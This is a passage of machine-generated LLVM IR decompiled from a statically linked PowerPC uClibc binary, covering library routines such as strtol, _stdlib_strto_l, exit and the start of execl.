  %v3_1000ba68 = load i32, i32* %v2_1000ba68, align 4
  store i32 %v3_1000ba68, i32* %r9.global-to-local, align 4
  %v1_1000ba6c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba6c = add i32 %v1_1000ba6c, 20
  %v3_1000ba6c = inttoptr i32 %v2_1000ba6c to i32*
  store i32 %v4_1000ba64, i32* %v3_1000ba6c, align 4
  %v0_1000ba70 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ba70 = mul i32 %v0_1000ba70, 4
  store i32 %v1_1000ba70, i32* %r0.global-to-local, align 4
  %v0_1000ba74 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ba74 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba74 = add i32 %v1_1000ba74, 8
  %v3_1000ba74 = inttoptr i32 %v2_1000ba74 to i32*
  store i32 %v0_1000ba74, i32* %v3_1000ba74, align 4
  %v0_1000ba78 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000ba78 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ba78 = add i32 %v1_1000ba78, %v0_1000ba78
  store i32 %v2_1000ba78, i32* %r0.global-to-local, align 4
  %v0_1000ba7c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ba7c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba7c = add i32 %v1_1000ba7c, 16
  %v3_1000ba7c = inttoptr i32 %v2_1000ba7c to i32*
  store i32 %v0_1000ba7c, i32* %v3_1000ba7c, align 4
  %v0_1000ba80 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ba80 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000ba80 = add i32 %v1_1000ba80, 24
  %v3_1000ba80 = inttoptr i32 %v2_1000ba80 to i32*
  store i32 %v0_1000ba80, i32* %v3_1000ba80, align 4
  store i32 268483208, i32* @lr, align 4
  %v0_1000ba84 = call i32 @srandom_r()
  %v0_1000ba88 = load i32, i32* @r31, align 4
  %v3_1000ba88 = icmp eq i32 %v0_1000ba88, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000ba94 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000ba94 = inttoptr i32 %v1_1000ba94 to i32*
  store i32 0, i32* %v2_1000ba94, align 4
  br i1 %v3_1000ba88, label %dec_label_pc_1000bacc, label %dec_label_pc_1000ba9c

dec_label_pc_1000ba9c:                            ; preds = %dec_label_pc_1000ba58
  %v0_1000ba9c = load i32, i32* @r30, align 4
  %v1_1000ba9c = add i32 %v0_1000ba9c, 4
  %v2_1000ba9c = inttoptr i32 %v1_1000ba9c to i32*
  %v3_1000ba9c = load i32, i32* %v2_1000ba9c, align 4
  %v0_1000baa0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000baa0 = sub i32 %v3_1000ba9c, %v0_1000baa0
  %v4_1000baa4 = sdiv i32 %v2_1000baa0, 4
  %v1_1000baa8 = mul i32 %v4_1000baa4, 5
  %v1_1000baac = load i32, i32* @r31, align 4
  %v2_1000baac = add i32 %v1_1000baa8, %v1_1000baac
  store i32 %v2_1000baac, i32* %r0.global-to-local, align 4
  %v1_1000bab0 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000bab0 = inttoptr i32 %v1_1000bab0 to i32*
  store i32 %v2_1000baac, i32* %v2_1000bab0, align 4
  br label %dec_label_pc_1000bacc

dec_label_pc_1000bab8:                            ; preds = %dec_label_pc_1000ba4c
  %v0_1000bab8 = call i32 @__errno_location()
  store i32 %v0_1000bab8, i32* %r3.global-to-local, align 4
  %v0_1000babc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000babc = inttoptr i32 %v0_1000bab8 to i32*
  store i32 %v0_1000babc, i32* %v2_1000babc, align 4
  %v0_1000bac0 = call i32 @__errno_location()
  %v0_1000bac4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000bac4 = inttoptr i32 %v0_1000bac0 to i32*
  store i32 %v0_1000bac4, i32* %v2_1000bac4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bacc

dec_label_pc_1000bacc:                            ; preds = %dec_label_pc_1000ba58, %dec_label_pc_1000ba9c, %dec_label_pc_1000bab8
  store i32 %v0_1000ba00, i32* %r0.global-to-local, align 4
  %v0_1000badc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000badc

; uselistorder directives
  uselistorder i32 %v2_1000ba60, { 1, 0, 2 }
  uselistorder i32 %v0_1000ba58, { 1, 0 }
  uselistorder i32 %v2_1000ba0c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10013534.627 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000bacc, { 2, 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000bae8 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000bae8
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000baf0 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000baf0
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000bb04 = load i32, i32* @r4, align 4
  store i32 %v0_1000bb04, i32* @r25, align 4
  %v0_1000bb0c = load i32, i32* @r5, align 4
  store i32 %v0_1000bb0c, i32* %r30.global-to-local, align 4
  %v0_1000bb10 = load i32, i32* @r6, align 4
  store i32 %v0_1000bb10, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000bb18 = load i32, i32* @global_var_100249f0, align 4
  br label %dec_label_pc_1000bb24

dec_label_pc_1000bb20:                            ; preds = %dec_label_pc_1000bb24
  %v1_1000bb20 = add i32 %v0_1000bb58, 1
  store i32 %v1_1000bb20, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bb24

dec_label_pc_1000bb24:                            ; preds = %entry, %dec_label_pc_1000bb20
  %v0_1000bb58 = phi i32 [ %tmp, %entry ], [ %v1_1000bb20, %dec_label_pc_1000bb20 ]
  %v1_1000bb24 = inttoptr i32 %v0_1000bb58 to i8*
  %v2_1000bb24 = load i8, i8* %v1_1000bb24, align 1
  %v3_1000bb24 = zext i8 %v2_1000bb24 to i32
  %v1_1000bb28 = mul nuw nsw i32 %v3_1000bb24, 2
  %v2_1000bb2c = add i32 %v1_1000bb28, %v3_1000bb18
  %v3_1000bb2c = inttoptr i32 %v2_1000bb2c to i16*
  %v4_1000bb2c = load i16, i16* %v3_1000bb2c, align 2
  %v1_1000bb30 = and i16 %v4_1000bb2c, 32
  %v3_1000bb30 = icmp eq i16 %v1_1000bb30, 0
  br i1 %v3_1000bb30, label %dec_label_pc_1000bb38, label %dec_label_pc_1000bb20

dec_label_pc_1000bb38:                            ; preds = %dec_label_pc_1000bb24
  %v3_1000bb38 = icmp eq i8 %v2_1000bb24, 43
  br i1 %v3_1000bb38, label %dec_label_pc_1000bb58, label %dec_label_pc_1000bb40

dec_label_pc_1000bb40:                            ; preds = %dec_label_pc_1000bb38
  %v3_1000bb40 = icmp eq i8 %v2_1000bb24, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000bb40, label %dec_label_pc_1000bb58, label %dec_label_pc_1000bb5c

dec_label_pc_1000bb58:                            ; preds = %dec_label_pc_1000bb38, %dec_label_pc_1000bb40
  %storemerge = phi i32 [ 1, %dec_label_pc_1000bb40 ], [ 0, %dec_label_pc_1000bb38 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000bb58 = add i32 %v0_1000bb58, 1
  store i32 %v1_1000bb58, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bb5c

dec_label_pc_1000bb5c:                            ; preds = %dec_label_pc_1000bb40, %dec_label_pc_1000bb58
  %v1_1000bb5c = call i32 @__asm_rlwinm.(i32 %v0_1000bb0c, i32 0, i32 28, i32 26)
  %v4_1000bb5c = icmp eq i32 %v1_1000bb5c, 0
  br i1 %v4_1000bb5c, label %dec_label_pc_1000bb68, label %dec_label_pc_1000bb5c.dec_label_pc_1000bba4_crit_edge

dec_label_pc_1000bb5c.dec_label_pc_1000bba4_crit_edge: ; preds = %dec_label_pc_1000bb5c
  %v0_1000bba4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bba4

dec_label_pc_1000bb68:                            ; preds = %dec_label_pc_1000bb5c
  %v0_1000bb68 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000bb68 = inttoptr i32 %v0_1000bb68 to i8*
  %v2_1000bb68 = load i8, i8* %v1_1000bb68, align 1
  %v0_1000bb6c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000bb6c = add i32 %v0_1000bb6c, 10
  store i32 %v1_1000bb6c, i32* %r30.global-to-local, align 4
  %v3_1000bb70 = icmp eq i8 %v2_1000bb68, 48
  br i1 %v3_1000bb70, label %dec_label_pc_1000bb78, label %dec_label_pc_1000bb98

dec_label_pc_1000bb78:                            ; preds = %dec_label_pc_1000bb68
  %v1_1000bb78 = add i32 %v0_1000bb68, 1
  %v2_1000bb78 = inttoptr i32 %v1_1000bb78 to i8*
  %v3_1000bb78 = load i8, i8* %v2_1000bb78, align 1
  %v4_1000bb78 = zext i8 %v3_1000bb78 to i32
  store i32 %v1_1000bb78, i32* %r31.global-to-local, align 4
  %v1_1000bb7c = add i32 %v0_1000bb6c, 8
  store i32 %v1_1000bb7c, i32* %r30.global-to-local, align 4
  %v1_1000bb80 = or i32 %v4_1000bb78, 32
  %v3_1000bb88 = icmp eq i32 %v1_1000bb80, 120
  br i1 %v3_1000bb88, label %dec_label_pc_1000bb90, label %dec_label_pc_1000bb98

dec_label_pc_1000bb90:                            ; preds = %dec_label_pc_1000bb78
  %v1_1000bb90 = mul i32 %v1_1000bb7c, 2
  store i32 %v1_1000bb90, i32* %r30.global-to-local, align 4
  %v1_1000bb94 = add i32 %v0_1000bb68, 2
  store i32 %v1_1000bb94, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bb98

dec_label_pc_1000bb98:                            ; preds = %dec_label_pc_1000bb78, %dec_label_pc_1000bb68, %dec_label_pc_1000bb90
  %v0_1000bc4c15 = phi i32 [ %v1_1000bb78, %dec_label_pc_1000bb90 ], [ %tmp, %dec_label_pc_1000bb68 ], [ %v1_1000bb78, %dec_label_pc_1000bb78 ]
  %v0_1000bb98 = phi i32 [ %v1_1000bb90, %dec_label_pc_1000bb90 ], [ %v1_1000bb6c, %dec_label_pc_1000bb68 ], [ %v1_1000bb7c, %dec_label_pc_1000bb78 ]
  %tmp22 = icmp slt i32 %v0_1000bb98, 17
  br i1 %tmp22, label %dec_label_pc_1000bba4, label %dec_label_pc_1000bba0

dec_label_pc_1000bba0:                            ; preds = %dec_label_pc_1000bb98
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bba4

dec_label_pc_1000bba4:                            ; preds = %dec_label_pc_1000bb5c.dec_label_pc_1000bba4_crit_edge, %dec_label_pc_1000bb98, %dec_label_pc_1000bba0
  %v0_1000bc4c14 = phi i32 [ %tmp, %dec_label_pc_1000bb5c.dec_label_pc_1000bba4_crit_edge ], [ %v0_1000bc4c15, %dec_label_pc_1000bb98 ], [ %v0_1000bc4c15, %dec_label_pc_1000bba0 ]
  %v1_1000bbb8 = phi i32 [ %v0_1000bba4.pre, %dec_label_pc_1000bb5c.dec_label_pc_1000bba4_crit_edge ], [ %v0_1000bb98, %dec_label_pc_1000bb98 ], [ 16, %dec_label_pc_1000bba0 ]
  %v1_1000bba4 = add i32 %v1_1000bbb8, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000bbac = icmp ugt i32 %v1_1000bba4, 34
  br i1 %v2_1000bbac, label %dec_label_pc_1000bc44, label %dec_label_pc_1000bbb4

dec_label_pc_1000bbb4:                            ; preds = %dec_label_pc_1000bba4
  %v2_1000bbb8 = udiv i32 -1, %v1_1000bbb8
  store i32 %v2_1000bbb8, i32* @r29, align 4
  %v2_1000bbbc = mul i32 %v2_1000bbb8, %v1_1000bbb8
  %v1_1000bbc0 = sub i32 -1, %v2_1000bbbc
  %v1_1000bbc4 = urem i32 %v1_1000bbc0, 256
  store i32 %v1_1000bbc4, i32* @r27, align 4
  %v0_1000bbd0.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000bbd0

dec_label_pc_1000bbcc:                            ; preds = %dec_label_pc_1000bc38, %dec_label_pc_1000bc20
  %v1_1000bbd4.pre = phi i32 [ %v1_1000bbd8, %dec_label_pc_1000bc38 ], [ %v1_1000bbd4.pre.pre, %dec_label_pc_1000bc20 ]
  %v0_1000bbd4.pre = phi i32 [ %v2_1000bc3c, %dec_label_pc_1000bc38 ], [ %v0_1000bbd4.pre.pre, %dec_label_pc_1000bc20 ]
  %v0_1000bbcc = phi i32 [ %v1_1000bbdc, %dec_label_pc_1000bc38 ], [ %v0_1000bbcc.pre, %dec_label_pc_1000bc20 ]
  br label %dec_label_pc_1000bbd0

dec_label_pc_1000bbd0:                            ; preds = %dec_label_pc_1000bbb4, %dec_label_pc_1000bbcc
  %v0_1000bc4c12 = phi i32 [ %v0_1000bc4c14, %dec_label_pc_1000bbb4 ], [ %v0_1000bbcc, %dec_label_pc_1000bbcc ]
  %v0_1000bbdc = phi i32 [ %v0_1000bbd0.pre, %dec_label_pc_1000bbb4 ], [ %v0_1000bbcc, %dec_label_pc_1000bbcc ]
  %v1_1000bbd8 = phi i32 [ %v2_1000bbb8, %dec_label_pc_1000bbb4 ], [ %v1_1000bbd4.pre, %dec_label_pc_1000bbcc ]
  %v0_1000bc38 = phi i32 [ 0, %dec_label_pc_1000bbb4 ], [ %v0_1000bbd4.pre, %dec_label_pc_1000bbcc ]
  %v1_1000bbd0 = inttoptr i32 %v0_1000bbdc to i8*
  %v2_1000bbd0 = load i8, i8* %v1_1000bbd0, align 1
  %v3_1000bbd0 = zext i8 %v2_1000bbd0 to i32
  %v3_1000bbd4 = icmp ugt i32 %v0_1000bc38, %v1_1000bbd8
  %v1_1000bbdc = add i32 %v0_1000bbdc, 1
  store i32 %v1_1000bbdc, i32* %r31.global-to-local, align 4
  %v1_1000bbe0 = add nsw i32 %v3_1000bbd0, -48
  %v1_1000bbe4 = or i32 %v3_1000bbd0, 32
  %v1_1000bbe8 = urem i32 %v1_1000bbe0, 256
  %tmp23 = icmp ult i32 %v1_1000bbe8, 10
  br i1 %tmp23, label %dec_label_pc_1000bc08, label %dec_label_pc_1000bbf8

dec_label_pc_1000bbf8:                            ; preds = %dec_label_pc_1000bbd0
  %tmp24 = icmp ult i32 %v1_1000bbe4, 97
  br i1 %tmp24, label %dec_label_pc_1000bc08, label %dec_label_pc_1000bc04

dec_label_pc_1000bc04:                            ; preds = %dec_label_pc_1000bbf8
  %v1_1000bbf8 = add nsw i32 %v1_1000bbe4, -87
  %v1_1000bc04 = urem i32 %v1_1000bbf8, 256
  br label %dec_label_pc_1000bc08

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bbf8, %dec_label_pc_1000bbd0, %dec_label_pc_1000bc04
  %v1_1000bc3c = phi i32 [ 40, %dec_label_pc_1000bbf8 ], [ %v1_1000bbe8, %dec_label_pc_1000bbd0 ], [ %v1_1000bc04, %dec_label_pc_1000bc04 ]
  %v1_1000bc08 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000bc08 = icmp slt i32 %v1_1000bc3c, %v1_1000bc08
  br i1 %v2_1000bc08, label %dec_label_pc_1000bc10, label %dec_label_pc_1000bc44

dec_label_pc_1000bc10:                            ; preds = %dec_label_pc_1000bc08
  br i1 %v3_1000bbd4, label %dec_label_pc_1000bc20, label %dec_label_pc_1000bc14

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc10
  %v1_1000bc14 = load i32, i32* @r27, align 4
  %v0_1000bc18.not = icmp ne i32 %v0_1000bc38, %v1_1000bbd8
  %tmp25 = icmp ule i32 %v1_1000bc3c, %v1_1000bc14
  %or.cond = or i1 %tmp25, %v0_1000bc18.not
  br i1 %or.cond, label %dec_label_pc_1000bc38, label %dec_label_pc_1000bc20

dec_label_pc_1000bc20:                            ; preds = %dec_label_pc_1000bc14, %dec_label_pc_1000bc10
  %v0_1000bc20 = call i32 @__errno_location()
  %v0_1000bc24 = load i32, i32* @r28, align 4
  %v1_1000bc24 = load i32, i32* @r26, align 4
  %v2_1000bc24 = and i32 %v1_1000bc24, %v0_1000bc24
  store i32 %v2_1000bc24, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000bc30 = inttoptr i32 %v0_1000bc20 to i32*
  store i32 34, i32* %v2_1000bc30, align 4
  %v0_1000bbcc.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000bbd4.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bbd4.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000bbcc

dec_label_pc_1000bc38:                            ; preds = %dec_label_pc_1000bc14
  %v2_1000bc38 = mul i32 %v1_1000bc08, %v0_1000bc38
  %v2_1000bc3c = add i32 %v2_1000bc38, %v1_1000bc3c
  store i32 %v2_1000bc3c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bbcc

dec_label_pc_1000bc44:                            ; preds = %dec_label_pc_1000bc08, %dec_label_pc_1000bba4
  %v0_1000bc4c = phi i32 [ %v0_1000bc4c14, %dec_label_pc_1000bba4 ], [ %v0_1000bc4c12, %dec_label_pc_1000bc08 ]
  %v0_1000bc44 = load i32, i32* @r25, align 4
  %v3_1000bc44 = icmp eq i32 %v0_1000bc44, 0
  br i1 %v3_1000bc44, label %dec_label_pc_1000bc50, label %dec_label_pc_1000bc4c

dec_label_pc_1000bc4c:                            ; preds = %dec_label_pc_1000bc44
  %v2_1000bc4c = inttoptr i32 %v0_1000bc44 to i32*
  store i32 %v0_1000bc4c, i32* %v2_1000bc4c, align 4
  br label %dec_label_pc_1000bc50

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc44, %dec_label_pc_1000bc4c
  %v0_1000bc50 = load i32, i32* @r26, align 4
  %v3_1000bc50 = icmp eq i32 %v0_1000bc50, 0
  %v0_1000bc54 = load i32, i32* @r28, align 4
  %v1_1000bc54 = sub i32 0, %v0_1000bc54
  %tmp27 = lshr i32 %v1_1000bc54, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000bc94.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000bc50, label %dec_label_pc_1000bc84, label %dec_label_pc_1000bc6c

dec_label_pc_1000bc6c:                            ; preds = %dec_label_pc_1000bc50
  %v3_1000bc6c = icmp ugt i32 %v0_1000bc94.pre.pre, %tmp28
  br i1 %v3_1000bc6c, label %dec_label_pc_1000bc74, label %dec_label_pc_1000bc84

dec_label_pc_1000bc74:                            ; preds = %dec_label_pc_1000bc6c
  %v0_1000bc74 = call i32 @__errno_location()
  %v2_1000bc7c = inttoptr i32 %v0_1000bc74 to i32*
  store i32 34, i32* %v2_1000bc7c, align 4
  %v0_1000bc80 = load i32, i32* @r31, align 4
  store i32 %v0_1000bc80, i32* %r8.global-to-local, align 4
  %v0_1000bc84.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000bc84

dec_label_pc_1000bc84:                            ; preds = %dec_label_pc_1000bc50, %dec_label_pc_1000bc6c, %dec_label_pc_1000bc74
  %v0_1000bc94.pre = phi i32 [ %v0_1000bc94.pre.pre, %dec_label_pc_1000bc6c ], [ %v0_1000bc80, %dec_label_pc_1000bc74 ], [ %v0_1000bc94.pre.pre, %dec_label_pc_1000bc50 ]
  %v0_1000bc84 = phi i32 [ %v0_1000bc54, %dec_label_pc_1000bc6c ], [ %v0_1000bc84.pre, %dec_label_pc_1000bc74 ], [ %v0_1000bc54, %dec_label_pc_1000bc50 ]
  %v3_1000bc84 = icmp eq i32 %v0_1000bc84, 0
  br i1 %v3_1000bc84, label %dec_label_pc_1000bc90, label %dec_label_pc_1000bc8c

dec_label_pc_1000bc8c:                            ; preds = %dec_label_pc_1000bc84
  %v1_1000bc8c = sub i32 0, %v0_1000bc94.pre
  store i32 %v1_1000bc8c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bc90

dec_label_pc_1000bc90:                            ; preds = %dec_label_pc_1000bc84, %dec_label_pc_1000bc8c
  %v0_1000bc94 = phi i32 [ %v1_1000bc8c, %dec_label_pc_1000bc8c ], [ %v0_1000bc94.pre, %dec_label_pc_1000bc84 ]
  ret i32 %v0_1000bc94

; uselistorder directives
  uselistorder i32 %v0_1000bc94.pre, { 1, 0 }
  uselistorder i32 %v0_1000bc94.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000bc3c, { 1, 0 }
  uselistorder i32 %v1_1000bbe8, { 1, 0 }
  uselistorder i32 %v1_1000bbe4, { 1, 0 }
  uselistorder i32 %v1_1000bbdc, { 1, 0 }
  uselistorder i32 %v3_1000bbd0, { 1, 0 }
  uselistorder i32 %v0_1000bc38, { 1, 0, 2 }
  uselistorder i32 %v1_1000bbd8, { 0, 2, 1 }
  uselistorder i32 %v0_1000bbcc, { 1, 0 }
  uselistorder i32 %v2_1000bbb8, { 1, 0, 2 }
  uselistorder i32 %v1_1000bb90, { 1, 0 }
  uselistorder i32 %v1_1000bb7c, { 1, 0, 2 }
  uselistorder i32 %v0_1000bb58, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder label %dec_label_pc_1000bc90, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bc50, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bbd0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bba4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bb98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bb5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb58, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb24, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000bcc0 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000bccc = load i32, i32* @r3, align 4
  store i32 %v0_1000bccc, i32* @r31, align 4
  store i32 %v2_1000bcc0, i32* @r3, align 4
  %v0_1000bcd8 = call i32 @__pthread_return_void()
  %v0_1000bce0 = call i32 @__pthread_return_0()
  %v3_1000bce8 = load i32, i32* @global_var_10024a6c.631, align 4
  %v3_1000bcec = icmp eq i32 %v3_1000bce8, 0
  br i1 %v3_1000bcec, label %dec_label_pc_1000bd00, label %dec_label_pc_1000bcf4

dec_label_pc_1000bcf4:                            ; preds = %entry
  %v0_1000bcf4 = load i32, i32* @r31, align 4
  %v3_1000bcfc = call i32 @unknown_0(i32 %v0_1000bcf4, i32 268566528)
  br label %dec_label_pc_1000bd00

dec_label_pc_1000bd00:                            ; preds = %entry, %dec_label_pc_1000bcf4
  store i32 %v2_1000bcc0, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000bd08 = call i32 @__pthread_return_void()
  store i32 %v0_1000bd08, i32* @r3, align 4
  store i32 268483856, i32* @lr, align 4
  %v1_1000bd0c = call i32 @__GI___uClibc_fini(i32 %v0_1000bd08)
  br i1 icmp eq (i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -31312), i32 0), label %dec_label_pc_1000bd24, label %dec_label_pc_1000bd20

dec_label_pc_1000bd20:                            ; preds = %dec_label_pc_1000bd00
  store i32 268483876, i32* @lr, align 4
  %v2_1000bd20 = call i32 @_stdio_term(i32 %v1_1000bd0c, i32 add (i32 ptrtoint ([62 x i8]* @global_var_10010000.5 to i32), i32 -31312))
  br label %dec_label_pc_1000bd24

dec_label_pc_1000bd24:                            ; preds = %dec_label_pc_1000bd00, %dec_label_pc_1000bd20
  %v0_1000bd24 = load i32, i32* @r31, align 4
  %v1_1000bd28 = call i32 @__GI__exit(i32 %v0_1000bd24)
  ret i32 %v1_1000bd28

; uselistorder directives
  uselistorder label %dec_label_pc_1000bd24, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd00, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000bd2c = ptrtoint i32* %stack_var_0 to i32
  %v2_1000bd48 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bd48, i32* %r0.global-to-local, align 4
  %v2_1000bd50 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000bd48, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bd7c

dec_label_pc_1000bd7c:                            ; preds = %dec_label_pc_1000bdac, %entry
  %v0_1000bd80 = phi i32 [ 0, %entry ], [ %v1_1000bd80, %dec_label_pc_1000bdac ]
  %stack_var_-52.0 = phi i32 [ %v2_1000bd50, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000bdac ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000bdac ]
  %v4_1000bd7c = zext i8 %stack_var_-56.0 to i32
  %v1_1000bd80 = add i32 %v0_1000bd80, 1
  %v1_1000bd88 = mul nuw nsw i32 %v4_1000bd7c, 4
  store i32 %v1_1000bd88, i32* %r0.global-to-local, align 4
  %v2_1000bd8c = add i32 %v1_1000bd88, %v2_1000bd48
  store i32 %v2_1000bd8c, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000bda0, label %dec_label_pc_1000bd98

dec_label_pc_1000bd98:                            ; preds = %dec_label_pc_1000bd7c
  %v1_1000bd90 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000bdac

dec_label_pc_1000bda0:                            ; preds = %dec_label_pc_1000bd7c
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000bda4 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000bda4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000bdac

dec_label_pc_1000bdac:                            ; preds = %dec_label_pc_1000bd98, %dec_label_pc_1000bda0
  %stack_var_-52.1 = phi i32 [ %v1_1000bda4, %dec_label_pc_1000bda0 ], [ %stack_var_-52.0, %dec_label_pc_1000bd98 ]
  %v0_1000bdac = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000bda0 ], [ %v2_1000bd8c, %dec_label_pc_1000bd98 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000bda0 ], [ %v1_1000bd90, %dec_label_pc_1000bd98 ]
  %v1_1000bdac = inttoptr i32 %v0_1000bdac to i32*
  %v2_1000bdac = load i32, i32* %v1_1000bdac, align 4
  store i32 %v2_1000bdac, i32* %r0.global-to-local, align 4
  %v3_1000bdb0 = icmp eq i32 %v2_1000bdac, 0
  br i1 %v3_1000bdb0, label %dec_label_pc_1000bdb8, label %dec_label_pc_1000bd7c

dec_label_pc_1000bdb8:                            ; preds = %dec_label_pc_1000bdac
  %v1_1000bdb8 = mul i32 %v1_1000bd80, 4
  store i32 %v4_1000bd2c, i32* %r0.global-to-local, align 4
  %v1_1000bdc0 = add i32 %v1_1000bdb8, 34
  store i32 %v1_1000bd80, i32* %ctr.global-to-local, align 4
  %v1_1000bdc8 = call i32 @__asm_rlwinm(i32 %v1_1000bdc0, i32 0, i32 0, i32 27)
  %v1_1000bdd0 = load i32, i32* @r1, align 4
  %v3_1000bdd0 = sub i32 %v1_1000bdd0, %v1_1000bdc8
  %v4_1000bdd0 = inttoptr i32 %v3_1000bdd0 to i32*
  store i32 %v4_1000bd2c, i32* %v4_1000bdd0, align 4
  %v1_1000bdd4 = add i32 %v3_1000bdd0, 23
  store i32 %v1_1000bdd4, i32* %r0.global-to-local, align 4
  %v1_1000bdd8 = call i32 @__asm_rlwinm(i32 %v1_1000bdd4, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000bde0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000bde0 = inttoptr i32 %v1_1000bdd8 to i32*
  store i32 %v0_1000bde0, i32* %v2_1000bde0, align 4
